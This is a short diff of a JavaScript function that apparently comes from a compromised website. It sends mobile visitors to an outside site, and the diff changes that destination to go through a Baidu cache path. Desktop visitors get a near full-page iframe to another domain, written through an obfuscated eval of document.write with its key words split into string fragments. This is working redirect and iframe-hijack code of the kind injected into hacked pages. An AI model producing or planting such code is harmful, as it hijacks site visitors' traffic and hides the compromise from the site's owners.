@@ -1,6 +1,6 @@
 function goPAGE() {
 if	((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-        window.location.href = "https://c.mipcdn.com/mip.hanmanman.com/cms/site/show?ID=178"
+        window.location.href = "https://m.baidu.com/mip/s/c.mipcdn.com/mip.hanmanman.com/cms/site/show?ID=178"
     } else {
         var ss = '<center id="yangchen"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="83' + '50" src="https://m.transcode.cn/c/s/wap.xiaoaipan.cn/"></iframe></center>';
         eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
